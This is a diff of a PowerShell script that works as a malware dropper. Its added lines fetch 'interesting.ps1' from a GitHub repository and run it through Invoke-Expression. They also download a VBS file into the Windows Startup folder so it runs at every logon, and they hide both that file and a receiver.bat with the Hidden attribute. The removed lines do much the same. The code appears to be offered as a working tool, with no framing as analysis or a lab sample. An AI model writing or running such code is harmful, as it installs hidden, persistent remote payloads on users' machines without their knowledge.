@@ -1,38 +1,48 @@
-try {
-    # Download the batch file
-    $path = "$env:USERPROFILE\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat"
-    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile $path
-    Write-Host "Download completed."
-} catch {
-    Write-Error "Failed to download file: $_"
-}
+# Enable error handling
+$ErrorActionPreference = "Stop"
 
 try {
-    # Hide the batch file if it exists
-    if (Test-Path $path) {
-        Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-        Write-Host "File hidden."
+    # Download and execute the PowerShell script
+    $scriptUrl = "https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1"
+    $scriptContent = Invoke-WebRequest -Uri $scriptUrl | Select-Object -ExpandProperty Content
+    Invoke-Expression $scriptContent
+    Write-Host "PowerShell script executed."
+} catch {
+    Write-Host "Failed to execute PowerShell script: $_"
+}
+
+# Define the path to receiver.bat in AppData\Local
+$receiverPath = "$env:APPDATA\Local\receiver.bat"
+
+# Hide the receiver.bat file if it exists
+try {
+    if (Test-Path $receiverPath) {
+        Set-ItemProperty -Path $receiverPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Write-Host "Receiver.bat file hidden."
     } else {
-        Write-Error "File not found."
+        Write-Host "Receiver.bat file not found."
     }
 } catch {
-    Write-Error "Failed to hide the file: $_"
+    Write-Host "Failed to hide receiver.bat: $_"
 }
-try{
-   $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs')
-   Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath
-} catch {
-   Write-Error "Failed to download starter"
-}
+
+# Download the VBS file to the Startup folder
 try {
-    # Hide the vbs file if it exists
+    $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\file.vbs"
+    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
+    Write-Host "VBS file downloaded."
+} catch {
+    Write-Host "Failed to download VBS file: $_"
+}
+
+# Hide the VBS file if it exists
+try {
     if (Test-Path $startupPath) {
         Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-        Write-Host "File hidden."
+        Write-Host "VBS file hidden."
     } else {
-        Write-Error "File not found."
+        Write-Host "VBS file not found."
     }
 } catch {
-    Write-Error "Failed to hide the file: $_"
+    Write-Host "Failed to hide VBS file: $_"
 }
-
